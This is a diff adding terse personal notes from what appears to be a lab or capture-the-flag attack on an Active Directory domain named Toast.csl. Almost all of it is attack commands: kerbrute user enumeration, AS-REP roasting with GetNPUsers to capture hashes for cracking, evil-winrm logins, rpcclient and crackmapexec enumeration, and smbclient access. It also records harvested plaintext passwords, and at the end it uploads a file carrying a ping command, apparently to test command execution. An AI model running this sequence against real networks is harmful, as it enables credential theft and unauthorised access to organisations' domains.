@@ -1,0 +1,50 @@
+~/go/bin/kerbrute userenum --dc Toast.csl -d Toast.csl /usr/share/wordlists/rockyou.txt  
+
+GetNPUsers.py -usersfile ad_user -dc-ip 172.31.3.8 Toast.csl/ -no-pass 
+sudo GetNPUsers.py -usersfile ad_user -dc-ip 172.31.3.8 Toast.csl/ -no-pass -outputfile AS_RESP_HASH -format john
+
+evil-winrm -u karen -p 'MANAGER' -i Toast.csl
+#evil-winrm not working
+
+Try to smbclient or rpc
+
+rpcclient -U karen 172.31.3.8 
+
+enumdomusers
+
+#found some new users
+
+smbclient -U Karen ////172.31.3.8/Users  
+
+crackmapexec smb -u karen -p MANAGER --shares Toast.csl
+
+smbclient -H \\\\Toast.csl\\potato -U Karen
+
+read a file in smbclient
+
+ rpcclient -U karen Toast.csl 
+
+#User querydispinfo
+#found creds
+ Account: Potato Name: HotPotato Desc: New Password: W2CUvphqXB
+
+crackmapexec smb -u potato -p W2CUvphqXB --shares Toast.csl 
+
+smbclient -H \\\\Toast.csl\\potato -U potato
+
+└─$ cat checkping                                                                                                1 ⚙ │
+ping -n 1 10.10.0.35    
+put checkping
+
+
+pinkdraconian.d4rkc0de.com  
+
+
+
+
+
+
+
+
+
+
